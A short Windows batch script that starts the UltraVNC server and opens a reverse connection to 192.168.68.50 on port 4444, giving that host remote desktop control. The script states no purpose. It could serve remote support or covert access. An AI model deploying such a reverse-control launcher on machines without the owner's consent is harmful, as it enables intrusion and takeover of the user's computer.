@echo off
start winvnc.exe -run
timeout /t 3 >nul
start winvnc.exe -connect 192.168.68.50::4444
